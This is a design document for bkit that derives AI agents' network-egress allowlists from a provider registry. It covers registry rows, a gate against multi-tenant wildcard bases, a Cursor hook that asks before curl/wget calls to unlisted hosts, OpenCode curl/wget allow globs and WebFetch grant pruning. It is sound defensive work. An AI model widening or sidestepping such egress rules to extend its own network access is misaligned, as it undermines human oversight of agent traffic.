Verdict: PASS
<!-- verdict:end -->

# Design: Auto-derive provider cloud-egress domains from the provider registries

## Related Issues

- #394 — Domain allowlist sync base config.md Claude Cursor OpenCode (closed) — landed the tooling ∪ consumer union, apex + `*.` expansion, and the three per-host encodings this issue derives into. Its carried-forward items (`enrichClaudeSettingsWebFetch` additive-only; `SHIPPED_NETWORK_BASES` hand-sync) are in this issue's scope.
- #376 — Add Z.AI (GLM) Moonshot (Kimi) OpenCode providers (closed, completed) — source of the "registrable base, not raw subdomain" direction, of the `kimi.com` docs-host asymmetry, and of the rejection of consumer content driving hash-gated shipped artifacts.

## Acceptance Scenario

### Narrative

As a consumer, I install bkit with whatever providers I want (`--opencode=zai`, a GitHub tracker, the skills registry), paste the network allowlist that `.claude/cloud.md` / `.cursor/cloud.md` generates into my Claude/Cursor dashboard once, and my cloud agent reaches every host bkit configured it to call — without me hand-declaring a single provider API host. Switching or adding a provider later needs no re-paste and no edit anywhere. My own stack domains in `.agents/config.md` stay the only thing I declare, and when I remove one it actually loses its grant.

### Success Criteria

1. After one install and one dashboard paste, a cloud session reaches every host bkit ships configuration for — including the six that are unreachable today (`groq.com`, `cerebras.ai`, `openrouter.ai`, `githubcopilot.com`, `models.dev`, `skills.sh`) — and the cloud paste block carries provider hosts even when the consumer declared no `allowed-domains`.
2. Adding or removing a provider/host source is a one-table edit: no other domain list exists in the repo, and CI fails if any of the five encoding surfaces (cloud paste, `.cursor/allowlist.json`, Claude `WebFetch`, OpenCode `curl`/`wget`, Cursor hook) misses an entry.
3. `bkit check` reports 0 writes on a clean install and a clean upgrade, for every module combination — no consumer-varying content lands in a byte-equal-hash-gated artifact.
4. A domain dropped from `allowed-domains`, or a host dropped from the registry, loses its `WebFetch(domain:…)` grant on the next install/upgrade; a grant the consumer added by hand is never removed.
5. Every doc that describes the allowlist states the derived-from-registry behaviour and the hook's runtime-artifact dependency, changed in the same commit as the code.

### Key Edge Cases

- **`.cursor/allowlist.json` absent or corrupt while the hook carries no fallback list** — the hook must ask on every `curl`/`wget` (including `github.com`) rather than allow, and must name the recovery. Shapes the decision to delete the hook's list only if the artifact is co-written with the hook in the same pass.
- **Registry entries with no derivable host** — `ollama-local` (loopback `localhost:11434`), `opencode-zen` / `opencode-go` (empty `baseURL`). Must contribute nothing or an explicitly declared host; never `localhost`, an IP literal, or `""`.
- **Base collapse landing on a multi-tenant apex or multi-label public suffix** — a future provider on `*.amazonaws.com` / `*.googleapis.com` / `example.co.uk` silently grants far more than intended. Must fail at authoring time, not ship.
- **Hosts no `baseURL` can yield** — `kimi.com` is Kimi's docs host while its API host is `api.moonshot.ai`; MCP, package-registry, skills and agent-host hosts have no `baseURL` at all. Pure derivation drops them and regresses #376.
- **The cloud allowlist is human-mediated** — it is pasted into a vendor dashboard by a person, and nothing in the toolchain can detect that the pasted value is stale. Any design that makes the list change often converts a correctness win into a support burden.
- **Prune with no provenance** — first run after upgrade (no record of what bkit wrote) and consumer hand-added grants. Must prune nothing rather than guess.

### Process Sketch

- WHEN `bkit install` / `bkit upgrade` runs -> THEN one derived host set (all bkit registries + explicitly declared non-derivable hosts) unions with consumer `allowed-domains` and reaches all five encoding surfaces in the same pass.
- WHEN a provider or host source is added to the registry -> THEN every surface carries it on the next install, and no second list is edited anywhere.
- WHEN a registry entry yields no usable host (loopback, IP literal, empty `baseURL`) -> THEN it contributes nothing unless it declares an explicit egress host with a recorded reason.
- WHEN a derived base is a multi-tenant apex or a multi-label public suffix -> THEN CI fails in the bkit repo and nothing ships.
- WHEN `.cursor/allowlist.json` is absent or corrupt -> THEN the Cursor hook asks on every outbound `curl`/`wget` and its message names `bkit install` as the fix.
- WHEN a host leaves the derived set or a consumer removes an `allowed-domains` entry -> THEN its `WebFetch(domain:…)` grant is removed only if bkit recorded writing it; unrecorded entries survive untouched.

## Architecture

### Verified ground truth (re-checked in this worktree; supersedes brainstorm claims where they differ)

<!-- prettier-ignore -->
| Fact | Source |
| --- | --- |
| `BKIT_SHIPPED_NETWORK_DOMAINS` — 13 flat, install-state-independent bases | `.bkit/src/bkit-cloud-env.ts:471-485` |
| `resolveNetworkAllowlist` = shipped ∪ consumer, apex + `*.` expanded | `.bkit/src/bkit-cloud-env.ts:505-507` |
| **`renderCloudNetworkAllowlist` renders `expandAllowedDomains(extractAllowedDomains(cwd))` — consumer-only.** The shipped list never reaches cloud egress. | `.bkit/src/bkit-cloud-env.ts:546-557` |
| `renderCursorNetworkAllowlist` emits declared entries **verbatim, no `*.` expansion**, by deliberate policy (Cursor's own broad-wildcard warning) | `.bkit/src/bkit-cloud-env.ts:646-669` |
| `.cursor/allowlist.json` writer — generated artifact, **not in any manifest**, free to vary per consumer | `.bkit/src/bkit-cloud-env.ts:510-538` |
| `SHIPPED_NETWORK_BASES` — hand-typed duplicate of the same 13 bases, held by a `keep in sync with …` comment; no test references it | `.cursor/hooks/guardrails.cjs:109-124` + `.bkit/templates/.cursor/hooks/guardrails.cjs` |
| Hook is manifest `format: "byte-equal-text"`, written by `writeTier1` (force-overwrite) — consumer-varying content breaks `bkit check` for everyone | `.bkit/src/bkit-manifest.ts:267`; `.bkit/src/bkit-modules.ts:1272-1281` |
| `loadNetworkAllowlistBases()` seeds from `SHIPPED_NETWORK_BASES`, unions `.cursor/allowlist.json`, empty-catch on missing/corrupt | `.cursor/hooks/guardrails.cjs:126-145` |
| `curlWgetHostAllowed` = **every** parsed URL host must match a base on label boundary; no parseable URL -> ask | `.cursor/hooks/guardrails.cjs:154-192` |
| `.claude/settings.json` is manifest `format: "json"` (deep-containment) — per-consumer `WebFetch` entries are already tolerated | `.bkit/src/bkit-manifest.ts:239` |
| Shipped `settings.json` template's `WebFetch(domain:…)` seed is a **partial** copy (apexes missing for 7 of 13 bases); enrich silently tops it up | `.bkit/templates/.claude/settings.json:10-28` |
| `enrichClaudeSettingsWebFetch` is additive-only and says so in its own JSDoc | `.bkit/src/bkit-modules.ts:1716-1758` |
| `injectOpencodeNetworkCurlAllows` writes `curl *{base}*` / `wget *{base}*` from the same list | `.bkit/src/bkit-modules.ts:1706-1714` |
| **`bkit-modules.ts` already imports `resolveNetworkAllowlist` / `networkAllowlistBases` / `writeNetworkAllowlistArtifact` from `bkit-cloud-env.ts`** | `.bkit/src/bkit-modules.ts:59-65` |
| `OPENCODE_PROVIDER_DEFAULTS` is **module-private** (`const`, not exported) with 5 in-file call sites — 10 keys, not 11 | `.bkit/src/bkit-modules.ts:1397-1500, 1508, 1518, 1642, 1965` |
| Hook + `.cursor/allowlist.json` are written in the **same `runCursorModule` pass**; upgrade writes the artifact under the same `renderModules.has("cursor")` gate | `.bkit/src/bkit-modules.ts:1272-1281` and `:1332-1341`; `.bkit/src/bkit-install.ts:2595-2604` |
| `enrichClaudeSettingsWebFetch` runs in the same `runClaudeModule` pass that writes `settings.json`, and again on upgrade | `.bkit/src/bkit-modules.ts:1033`; `.bkit/src/bkit-install.ts:2605-2616` |
| `.bkit/version` JSON envelope = `{ pinnedVersion, tier3Hashes, canonicalHashes }`; `canonicalHashes` itself landed as an additive field with a `{}` default | `.bkit/src/bkit-version.ts:37-113` |
| `.claude/cloud.md` / `.cursor/cloud.md` are gitignored + **UNTRACKED** — never in a WriteSet / manifest / `canonicalHashes` | `.bkit/src/bkit-cloud-env.ts:574-586, 672-689` |
| Unit-lane coverage `--coverage.include` is an explicit brace list of `.bkit/src/bkit-{…}.ts` files with `branches=70`; `bkit-modules` is **not** in it | `package.json:47` |
| slop-scan per-symbol exemptions: `structure.pass-through-wrappers` for `networkAllowlistBases`; `defensive.empty-catch` for `loadNetworkAllowlistBases` | `slop-scan.config.json:155-163`, `:173-181` |
| Node engine `>=20` — `URL.canParse` is available; no `try`/`catch` needed around URL parsing | `package.json:28-30` |

Added in review round 1 — each re-verified against source in this worktree, and each load-bearing for a resolution below:

<!-- prettier-ignore -->
| Fact | Source |
| --- | --- |
| **`runCoreModule`'s deferred `postDispatch` writes `.bkit/version` from a FRESH object literal** `{ pinnedVersion, tier3Hashes, canonicalHashes }` — it reads the existing file only for the two hash maps | `.bkit/src/bkit-modules.ts:858-930`, literal at `:924-928` |
| Its predicate is `needsWrite = versionChanged \|\| hasNewEntries`; `ws.writes.push` is unconditional and only the `fs` write is `!dryRun`-gated | `.bkit/src/bkit-modules.ts:914-930` |
| `updateCanonicalHashesAfterUpgrade` — the upgrade-side `.bkit/version` writer — re-reads the file and writes `{ ...bkitVersion, pinnedVersion, canonicalHashes }`, so unknown fields **survive** | `.bkit/src/bkit-upgrade.ts:483, 475-481` |
| …but it has three returns that skip the write entirely: `options.dryRun`, `!bkitVersion`, and `seedablePaths.size === 0 && pinnedVersion === bkitVersion.pinnedVersion` | `.bkit/src/bkit-upgrade.ts:449, 484, 474` |
| **Install and upgrade therefore disagree today**: a field written by a module is clobbered on install and preserved on upgrade | the two rows above |
| `ModuleContext` is a **single shared object** passed to every module fn (`fn(ctx)` in a loop); `postDispatch` callbacks run after **all** modules return | `.bkit/src/bkit-modules.ts:3529-3542` |
| `MODULE_DISPATCH_ORDER` = `core` first, `claude` second — `runClaudeModule` has already run when core's `postDispatch` closure executes | `.bkit/src/bkit-modules.ts:3511-3522` |
| `enrichClaudeSettingsWebFetch` has **four** returns before/without writing: file absent; `JSON.parse` catch; `permissions.allow` not an array; `missing.length === 0`. Under `dryRun` it skips the write but still pushes to `ws.writes` | `.bkit/src/bkit-modules.ts:1737-1758` |
| `tier3Hashes` / `canonicalHashes` are **required** properties of `BkitVersion`, defaulted inside `parseBkitVersion` — "additive like `canonicalHashes`" means required-with-parser-default, not optional | `.bkit/src/bkit-version.ts:37-65`, `:88-104` |
| `sha256` is already exported from `bkit-version.ts`, which imports only node builtins — `bkit-cloud-env.ts -> bkit-version.ts` is cycle-free | `.bkit/src/bkit-version.ts:190` |
| `.claude/settings.json` and `.cursor/allowlist.json` are **git-tracked** (`git ls-files`) and in no `.gitignore` rule — every grant removal is a line in `git diff` | `git ls-files`; `.gitignore:52-68` |
| `.bkit/advisories.md` is a real durable artifact written by `writeAdvisoriesArtifact` on **install / check / doctor** — gitignored, fully regenerated each run. **`bkit upgrade` does not write it.** | `.bkit/src/bkit-postinstall.ts:2215-2243`; `.bkit/src/bkit-install.ts:2124, 2990`; `.gitignore:87-88` |
| Advisory shape is `PreflightFinding = { id, severity: "blocker" \| "advisory", detect, action }`; install flushes `ctx.advisories` through `runPostInstallCheck` -> `formatChecklist` banner + that artifact | `.bkit/src/bkit-preflight.ts:25-30`; `.bkit/src/bkit-install.ts:2988-2995` |
| Both cloud renderers emit the paste list inside a ` ```text ` fence and follow the **closing** fence with an italic prose line — the fence content is what the consumer pastes verbatim | `.bkit/src/bkit-cloud-env.ts:563-570` and `:658-666` |
| `renderCursorNetworkAllowlist`'s zero-declared branch says "**nothing extra is required here**" — false once shipped hosts always union in | `.bkit/src/bkit-cloud-env.ts:648-656` |
| **No test anywhere asserts a `WebFetch(domain:…)` literal** — repo-wide grep hits only `bkit-modules.ts:1717` (JSDoc), `:1748` (generator) and the template itself | repo-wide grep over `.bkit/src/*.test.ts` |
| Two tests assert the retiring Trusted branch: `expect(out).toContain("Set to **Trusted** (default)")` | `.bkit/src/bkit-cloud-env.test.ts:329` and `:401` |
| The only two `BKIT_SHIPPED_NETWORK_DOMAINS` assertions are **negative** (`not.toContain("vercel.com" / "supabase.com")`) — computing the constant breaks neither | `.bkit/src/bkit-cloud-env.test.ts:405-408` |
| `.cursor/hooks/guardrails.cjs` and its template twin are **byte-identical today** (`diff` clean) — test 6 is a pure regression guard, not a repair | `diff` of the two files |
| slop-scan's two cited exemptions are **file-scoped**, not symbol-scoped — new functions in `bkit-cloud-env.ts` inherit the pass-through exemption; no new exemption is needed | `slop-scan.config.json:155-163`, `:173-181` |
| `deepContains` uses **subset** semantics for arrays — emptying the template's WebFetch entries strictly relaxes containment; `bkit check` cannot regress from it | `.bkit/src/bkit-tiers.ts:69-71` |
| `ISSUE_TRACKERS` and `DEP_UPDATERS` both contain the literal `"none"` | `.bkit/src/bkit-manifest.ts:71`, `:100` |
| `json.schemastore.org` ships in the settings template's `$schema` — the one bkit-configured host outside the populated set | `.bkit/templates/.claude/settings.json:2` |
| Registry keys verbatim: `ollama-local`, `nvidia`, `groq`, `cerebras`, `openrouter`, `ollama`, `zai`, `moonshot`, `opencode-zen`, `opencode-go` — 10, and the two gateways are **distinct keys** | `.bkit/src/bkit-modules.ts:1413-1500` |
| Neither `.bkit/templates/.claude/cloud.md` nor `.bkit/templates/.cursor/cloud.md` contains any troubleshooting / timeout prose (`grep -i` returns nothing); both end with a `## 5 · Verify (first session)` section | `.bkit/templates/.claude/cloud.md:21-23, 87`; `.bkit/templates/.cursor/cloud.md:67-71` |

Corrections to the brainstorms carried into this design: the registry has **10** entries (not 11); `OPENCODE_PROVIDER_DEFAULTS` is **not exported**, so extracting it costs nothing outside `bkit-modules.ts`; `.claude/settings.json` is **not** byte-hash-gated (only `guardrails.cjs` is); and `.claude/cloud.md` is untracked, so it is technically free to vary per consumer — a fact that makes the rejected installed-set option feasible and is addressed in Decisions rather than assumed away.

### Live gaps this change closes (present today, before any derivation)

`groq.com`, `cerebras.ai`, `openrouter.ai` (registry providers), `githubcopilot.com` (GitHub tracker MCP — `github.com` does **not** cover it), `models.dev` (opencode built-in catalog resolution), `skills.sh` (skills registry). The hand-maintained list is not merely a duplication smell; it is already wrong.

### Target shape

```
                       .bkit/src/bkit-registry.ts   (NEW leaf — pure data, no imports, no branches)
                         OPENCODE_PROVIDER_DEFAULTS (moved verbatim from bkit-modules.ts)
                         BKIT_EGRESS_SOURCES        (MCP / agent-host / package-registry / skills / docs rows)
                                    |
              +---------------------+---------------------+
              |                                           |
   .bkit/src/bkit-cloud-env.ts                 .bkit/src/bkit-modules.ts
     deriveEgressEntries()  (pure, gated)        imports the registry for provider config
     BKIT_SHIPPED_NETWORK_DOMAINS  (computed)    imports resolveNetworkAllowlist (unchanged direction)
     BKIT_SHIPPED_NETWORK_HOSTS    (computed)
     resolveNetworkAllowlist()     (unchanged)
                                    |
        +---------------+-----------+-----------+---------------+
        |               |           |           |               |
   .claude/cloud.md  .cursor/    .cursor/   .claude/        .opencode/
   (paste block,     cloud.md    allowlist  settings.json   opencode.json
    apex + `*.`)     (exact       .json      WebFetch        curl/wget
                      hosts)                 (+ prune)       globs
                                    |
                       .cursor/hooks/guardrails.cjs
                       (no domain array — reads the artifact only)
```

The import direction is unchanged: `bkit-modules.ts -> bkit-cloud-env.ts -> bkit-registry.ts`. `bkit-registry.ts` imports nothing. The claimed cycle is real (verified at `bkit-modules.ts:59-65`) and the leaf module is what avoids it; because `OPENCODE_PROVIDER_DEFAULTS` is module-private, the move is a pure relocation plus one import line.

**Why the derivation function stays in `bkit-cloud-env.ts` and only the data moves.** `package.json:47` pins the unit coverage lane to a literal brace list of measured files with a `branches=70` threshold. `bkit-cloud-env.ts` is in that list; a new file would not be, so putting branching logic in the leaf module would move gated branches out of the measured set (the same accounting hazard already recorded in `slop-scan.config.json:157` for `networkAllowlistBases`). Keeping `bkit-registry.ts` branch-free (data only) sidesteps the lane question entirely.

### Derivation rule and gate

Two mechanisms, deliberately separated — the round-1 review found the draft conflated them, so the split is now explicit:

- **Proposer** (runtime, silent): decides whether a `baseURL` yields a candidate at all. Rejection here means "contributes nothing", per the Process Sketch. Never throws, never fails CI.
- **Gate** (test-only, bkit repo): judges a candidate the proposer accepted. Rejection here is CI red at authoring time. Never runs in a consumer install.

**Proposer**, applied to each registry `baseURL`:

```
host = URL.canParse(baseURL) ? new URL(baseURL).hostname : ""     # canParse first, NEVER try/catch
if host === ""                                       -> contributes nothing   # "" baseURL (both gateways)
if host === "localhost" || host.endsWith(".localhost") -> contributes nothing
if isIpLiteral(host)                                 -> contributes nothing
if host has < 2 labels                               -> contributes nothing   # bare "intranet", ".local" single-label
base = last two labels of host                       # api.z.ai -> z.ai; integrate.api.nvidia.com -> nvidia.com
```

`isIpLiteral(host)` — the detector the draft named as a failure case but never specified. `URL.hostname` normalises both families into two recognisable shapes, so no library and no regex zoo is needed:

```
IPv6 (and IPv4-mapped IPv6): hostname is BRACKETED  -> host.startsWith("[")
IPv4 (dotted quad, already normalised by WHATWG):   -> /^\d{1,3}(\.\d{1,3}){3}$/.test(host)
```

Both are proposer rejections (silent, "contributes nothing"), **not** gate rejections. This is the point the review flagged as un-implementable: `new URL("https://1.2.3.4/v1").hostname` is `"1.2.3.4"`, which passes a naive `>= 2 labels` check and collapses to the nonsense base `3.4`; `new URL("https://[::1]/v1").hostname` is `"[::1]"`, which would have failed the label gate as CI-red even though the Process Sketch promises silent omission. With the detector above, both land in the silent channel, and neither reaches the gate. WHATWG normalisation means `0x7f.1`, `2130706433` and `127.1` are all rewritten to a dotted quad by `URL` before the test sees them, so the one regex covers the shortened forms too. A future non-loopback IP `baseURL` therefore ships nothing rather than shipping `3.4` — and the completeness test (§ 6.1) is what makes that omission loud, because the row must then declare `bases: []` plus a `reason`.

**Gate** (test-enforced in the bkit repo; failing means CI red at authoring time, never a shipped surprise). Applied per candidate base:

```
base === host || host.endsWith("." + base)   # label boundary, not substring
base has >= 2 labels
base NOT in MULTI_LABEL_SUFFIXES             # co.uk, com.au, com.cn, co.jp, com.br, ...
base NOT in MULTI_TENANT_APEXES              # amazonaws.com, googleapis.com, azure.com,
                                             # azurewebsites.net, workers.dev, vercel.app,
                                             # pages.dev, hf.space, run.app, appspot.com, ...
```

A registry row may override `bases` (or declare `bases: []` with a recorded `reason`) **when and only when** the gate rejects the default. All 10 current entries pass the default with no override, so this change adds zero per-provider authoring burden today while making the next bad case fail loud.

## Data Model

### `EgressSource` — the one row shape (`.bkit/src/bkit-registry.ts`)

```ts
type EgressSource = {
  /**
   * Stable, UNIQUE, ATOMIC id. For `kind: "opencode-provider"` it is exactly a key of
   * `OPENCODE_PROVIDER_DEFAULTS` ("zai", "opencode-go"); otherwise a synthetic source id
   * ("mcp-github", "agent-claude"). Never a composite ("claude / cursor / opencode") —
   * the completeness test keys on this field.
   */
  id: string;
  /** Which shipped registry this row belongs to; drives the completeness test. */
  kind: "opencode-provider" | "tracker-mcp" | "agent-host" | "package-registry" | "skills" | "docs";
  /** Exact host(s) bkit configures something to call. [] only when no host is knowable. */
  hosts: readonly string[];
  /**
   * Registrable base(s) for apex + `*.` expansion. A LIST, not a scalar: several rows
   * legitimately carry more than one (`agent-claude` -> anthropic.com + claude.com).
   * `[]` means this row contributes no egress and MUST carry a `reason`.
   */
  bases: readonly string[];
  /** Required when `bases` is [] or overrides the derived default — recorded, not inferred. */
  reason?: string;
};
```

Two shape changes vs the v1 draft, both forced by the round-1 finding that the declared type could not express its own populated set:

1. **`base: string` -> `bases: readonly string[]`.** Three rows in the v1 table carried multiple bases in one cell; as a scalar the data was inexpressible. The `""`-means-nothing sentinel is replaced by the empty array, which removes the "is `""` a base or a marker?" ambiguity from every consumer of the field.
2. **No composite ids.** Every v1 row whose id read `a / b / c` is split into one row per id. This is what makes the completeness test mechanical: it iterates `Object.keys(OPENCODE_PROVIDER_DEFAULTS)` and asserts exactly one row with `kind === "opencode-provider" && id === key`, which a composite id can never satisfy. Duplicate `hosts` / `bases` across split rows are fine — the derived exports are sorted-unique.

`opencode-provider` rows are **derived** from `OPENCODE_PROVIDER_DEFAULTS[key].baseURL` at module init; every other `kind` is a **declared** row, because no `baseURL` exists to derive from.

### Populated set (the union this change ships)

One row per atomic `id`. 19 rows; 10 of them are exactly the 10 `OPENCODE_PROVIDER_DEFAULTS` keys, in registry order.

<!-- prettier-ignore -->
| kind | id | hosts | bases | note |
| --- | --- | --- | --- | --- |
| `opencode-provider` | `ollama-local` | `[]` | `[]` | `reason`: loopback `http://localhost:11434/v1`, no egress |
| `opencode-provider` | `nvidia` | `integrate.api.nvidia.com` | `nvidia.com` | derived |
| `opencode-provider` | `groq` | `api.groq.com` | `groq.com` | derived — **gap today** |
| `opencode-provider` | `cerebras` | `api.cerebras.ai` | `cerebras.ai` | derived — **gap today** |
| `opencode-provider` | `openrouter` | `openrouter.ai` | `openrouter.ai` | derived — **gap today** |
| `opencode-provider` | `ollama` | `ollama.com` | `ollama.com` | derived |
| `opencode-provider` | `zai` | `api.z.ai` | `z.ai` | derived |
| `opencode-provider` | `moonshot` | `api.moonshot.ai` | `moonshot.ai` | derived |
| `opencode-provider` | `opencode-zen` | `opencode.ai`, `models.dev` | `opencode.ai`, `models.dev` | `reason`: `baseURL` is `""` (builtin); endpoints resolved via models.dev |
| `opencode-provider` | `opencode-go` | `opencode.ai`, `models.dev` | `opencode.ai`, `models.dev` | `reason`: same — a **distinct** registry key, so a distinct row |
| `tracker-mcp` | `mcp-github` | `api.githubcopilot.com` | `githubcopilot.com` | declared — **gap today** |
| `tracker-mcp` | `mcp-linear` | `mcp.linear.app`, `api.linear.app` | `linear.app` | declared |
| `agent-host` | `agent-claude` | `console.anthropic.com` | `anthropic.com`, `claude.com` | declared — the multi-base row that forced `bases` to be a list |
| `agent-host` | `agent-cursor` | `api.cursor.com` | `cursor.com` | declared |
| `agent-host` | `agent-opencode` | `opencode.ai` | `opencode.ai` | declared |
| `package-registry` | `pkg-npm` | `registry.npmjs.org` | `npmjs.com` | declared |
| `package-registry` | `pkg-github` | `npm.pkg.github.com`, `raw.githubusercontent.com` | `github.com`, `githubusercontent.com` | declared |
| `skills` | `skills-sh` | `skills.sh` | `skills.sh` | declared — **gap today** |
| `docs` | `kimi-docs` | `kimi.com` | `kimi.com` | `reason`: docs host, not derivable from `api.moonshot.ai` (#376) |

`kimi-docs` carries `hosts: ["kimi.com"]`, **not** `[]`. Both reviews flagged the v1 `hosts: []` independently: `BKIT_SHIPPED_NETWORK_HOSTS` is the exact-host list `renderCursorNetworkAllowlist` unions in verbatim, so an empty `hosts` would have silently dropped `kimi.com` from the Cursor cloud surface — regressing on Cursor precisely the #376 grant this design elsewhere insists on preserving. The host is knowable, so the row states it. The general invariant this makes explicit: **a row with a non-empty `bases` and an empty `hosts` narrows the Cursor surface**; the completeness test (§ 6.1) asserts `hosts` is non-empty whenever `bases` is non-empty, so the shape cannot recur silently.

Deliberately **absent**, each with the reason recorded here so the next maintainer does not "fix" it:

- `DEP_UPDATERS` / `RENOVATE_RUNNERS` hosts (`developer.mend.io`, `depot.dev`) — their egress happens on GitHub Actions runners, not in an agent session; correctly absent today, and adding them widens the allowlist for no reachable benefit.
- `ISSUE_TRACKERS.none` and `DEP_UPDATERS.none` — `"none"` is a real member of both string-union constants (`bkit-manifest.ts:71`, `:100`), so "every key of every registry has a row" needs an explicit answer or the completeness test is unsatisfiable. The answer: **`"none"` is a sentinel, not a source.** The completeness test skips exactly the literal `"none"` in those two unions, and asserts that it is skipped, so a future non-sentinel member cannot slip through the same hole. `OPENCODE_PROVIDER_DEFAULTS` has no `"none"` key and is iterated in full.
- `json.schemastore.org` — shipped in `.bkit/templates/.claude/settings.json:2` as the `$schema` value, and the only remaining bkit-configured host outside this table. Deliberately out: it is fetched by the **editor's JSON language server** for authoring-time completion, never by an agent tool call, so no `WebFetch` / `curl` / hook decision is ever taken against it and granting it buys nothing. Recorded here rather than left as an apparent oversight against Success Criterion 2 — the criterion is about domain _lists_, and this is a single inline `$schema` URL, not a list.

### Derived exports (`.bkit/src/bkit-cloud-env.ts`)

<!-- prettier-ignore -->
| Symbol | Shape | Consumers |
| --- | --- | --- |
| `BKIT_SHIPPED_NETWORK_DOMAINS` | `readonly string[]` — sorted unique flatMap of every row's `bases` | unchanged name + type, so `resolveNetworkAllowlist` and its 4 downstreams need no signature change |
| `BKIT_SHIPPED_NETWORK_HOSTS` | `readonly string[]` — sorted unique flatMap of every row's `hosts` | `renderCursorNetworkAllowlist` only (its deliberate no-wildcard policy) |

Both are plain flatten-sort-unique over the row list, which is why the split-row/duplicate-value shape above costs nothing: `opencode.ai` appears in three rows and once in the export. Only the two negative assertions at `bkit-cloud-env.test.ts:405-408` touch `BKIT_SHIPPED_NETWORK_DOMAINS` today, so making it computed breaks no existing test.

### `.bkit/version` provenance field (additive) — and the write path that makes it real

```jsonc
{
  "pinnedVersion": "…",
  "tier3Hashes": { … },
  "canonicalHashes": { … },
  "webFetchDerived": ["WebFetch(domain:github.com)", "WebFetch(domain:*.github.com)", …]
}
```

Exact `WebFetch(domain:…)` strings bkit wrote into `.claude/settings.json` on the last install/upgrade that actually wrote it. This is the only field that makes a safe prune possible: nothing in `permissions.allow` distinguishes a bkit-authored entry from a consumer's hand-added one.

**Field shape — required, not optional.** `canonicalHashes` is a _required_ property of the `BkitVersion` interface with its `{}` default applied inside `parseBkitVersion` (`bkit-version.ts:37-65`, `:88-104`). "Additive exactly like `canonicalHashes`" therefore means `webFetchDerived: string[]` required-with-parser-default `[]`, not `webFetchDerived?: string[]`. Consequence, verified: three source-side object-literal construction sites must gain the field (`bkit-modules.ts:924-928`, the two `parseBkitVersion` returns at `bkit-version.ts:104` and `:110`); the `{ ...bkitVersion, … }` spreads in `bkit-upgrade.ts` are untouched. `tsconfig.json` excludes `**/*.test.ts` from `tsc --noEmit`, so the ~48 test-side `tier3Hashes:` literals do **not** break typecheck. Old payloads without the field parse to `[]` = "no record" = prune nothing.

#### The write path (this was the v1 draft's single largest defect)

The v1 draft assumed `enrichClaudeSettingsWebFetch` could record the field itself. It cannot on install: `runCoreModule`'s deferred `postDispatch` writes `.bkit/version` from a **fresh object literal** (`bkit-modules.ts:924-928`) and reads the existing file only for `tier3Hashes` / `canonicalHashes`. Enrich runs earlier — inside `runClaudeModule` at `:1033` — so anything it recorded is clobbered before the install ends. The two v1-implied outcomes were both fatal: either `previous` is permanently `[]` and the prune is dead code that passes hand-seeded unit tests while never firing in production, or enrich pushes `.bkit/version` into `ws.writes` on every run and `bkit check` is permanently red, violating Success Criterion 3. Install and upgrade also disagree today, because the upgrade-side writer spreads (`bkit-upgrade.ts:475-481`) while the install-side writer does not.

Resolution: **`.bkit/version` keeps exactly one writer per path, and the derived set is threaded into it.** Enrich never touches `.bkit/version`.

_Install path_ — `ModuleContext` is a single shared object handed to every module fn (`bkit-modules.ts:3529-3542`) and `MODULE_DISPATCH_ORDER` runs `core` then `claude` (`:3511-3522`), so a context field written by claude is readable by core's `postDispatch` closure, which executes after all modules return.

1. `ModuleContext` gains `webFetchRecorded?: readonly string[] | null` (default absent/null = "nothing to record this run").
2. `enrichClaudeSettingsWebFetch` returns the set it actually wrote (see § 3 for exactly which paths qualify); `runClaudeModule` assigns it to `ctx.webFetchRecorded` at the `:1033` call site. Non-writing paths leave it null.
3. Core's `postDispatch` literal gains `webFetchDerived`, resolved as `ctx.webFetchRecorded ?? existingVersion?.webFetchDerived ?? []` — **carry-forward, never clobber-to-empty**. A claude-less install, a `dryRun`, or an enrich early return all leave the previous record intact.
4. `needsWrite` extends from `versionChanged || hasNewEntries` to `versionChanged || hasNewEntries || derivedChanged`, where `derivedChanged` is a set comparison of the resolved value against `existingVersion?.webFetchDerived ?? []`. Without this, a run whose only change is the derived set would compute the new value and then not write it.
5. **Dry-run rule:** under `dryRun`, enrich writes nothing, so it returns null, so `ctx.webFetchRecorded` is null, so the resolved value equals the existing one, so `derivedChanged` is false and no `ws.writes` entry is pushed for `.bkit/version` on account of this field. `bkit check` therefore cannot go red from the provenance record — Success Criterion 3 holds by construction, not by inspection.

_Upgrade path_ — `updateCanonicalHashesAfterUpgrade` (`bkit-upgrade.ts:446-481`) is already the sole `.bkit/version` writer there and already spreads, so the field survives; it runs at `bkit-install.ts:2637`, after the enrich call at `:2610`. It gains an `options.webFetchDerived?: readonly string[] | null` fed from that enrich call's return value, applied to the `updated` literal only when non-null. Its "nothing to persist" early return (`:474`) must extend to `&& webFetchUnchanged`, or an upgrade whose only change is the derived set silently drops the record. Its `dryRun` return (`:449`) already gives the dry-run rule for free.

_Consequence to state plainly:_ `webFetchDerived` is `resolveNetworkAllowlist(cwd)`-derived, which includes the consumer's own `allowed-domains`, so a consumer's `vercel.com` / `sentry.io` land in `.bkit/version`. That is acceptable and not a contradiction of this design's "no consumer content in bkit-owned artifacts" line: `.bkit/version` is _already_ consumer-varying (per-consumer `canonicalHashes` paths) and is excluded from the published package (`package.json` `files` carries `"!.bkit/version"`). The rule this design defends is about **hash-gated shipped** artifacts — `guardrails.cjs` — not about the local state file. Recording only the shipped subset would break the prune, because a consumer-declared domain that leaves `allowed-domains` is exactly the case Success Criterion 4 requires to lose its grant.

_Plan-time proof obligation:_ before any prune code is written, seed `.bkit/version` in a tmp dir, run the real install, and read the file back to confirm `webFetchDerived` survives. If it does not, the prune sub-feature is re-scoped before the build, not during it.

## Components / Flows

### 1. Cloud egress paste blocks — the literal #381 defect

`renderCloudNetworkAllowlist` switches from `expandAllowedDomains(extractAllowedDomains(cwd))` to `resolveNetworkAllowlist(cwd)` (shipped ∪ derived ∪ consumer, apex + `*.`). Consequence: the `declared.length === 0` "Trusted default" branch disappears — Claude's Trusted list covers package registries and GitHub but **not** `api.z.ai`, so a consumer who declared nothing still needs Custom. The branch is replaced by a Custom block carrying the bkit set plus the existing pointer prose inviting them to add stack domains.

`renderCursorNetworkAllowlist` unions `BKIT_SHIPPED_NETWORK_HOSTS` (exact hosts) with the consumer's declared entries verbatim, preserving its deliberate no-wildcard narrowness. This is why each row carries `{hosts, bases}` and not `bases` alone: a base-only record has nothing correct to give the Cursor surface.

